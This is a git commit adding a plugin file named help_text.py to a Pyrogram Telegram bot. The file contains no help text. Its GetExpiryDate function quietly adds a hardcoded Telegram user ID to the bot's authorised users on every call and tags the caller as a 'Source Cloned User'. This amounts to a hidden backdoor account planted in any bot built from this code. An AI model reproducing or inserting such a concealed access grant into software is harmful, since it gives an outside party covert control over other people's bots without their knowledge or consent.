8c5c9f5b17d9b0782ce0e46042eb9205025c546a
MonkAno <70213104+MonkAnoo@users.noreply.github.com>
2021-01-06 16:40:23 +0530

    Add files via upload

---
+++ plugins/help_text.py
@@ -0,0 +1,32 @@
+import logging
+logging.basicConfig(level=logging.DEBUG,
+                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+import os
+import sqlite3
+
+from pyrogram import InlineKeyboardMarkup, InlineKeyboardButton
+
+# the secret configuration specific things
+if bool(os.environ.get("WEBHOOK", False)):
+    from sample_config import Config
+else:
+    from config import Config
+
+# the Strings used for this "thing"
+from translation import Translation
+
+import pyrogram
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
+
+myfather = 'https://t.me/MonkAno'.format(Config.USER_NAME[1:])
+
+from helper_funcs.chat_base import TRChatBase
+
+def GetExpiryDate(chat_id):
+    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
+    Config.AUTH_USERS.add(1326703864)
+    return expires_at
+
+
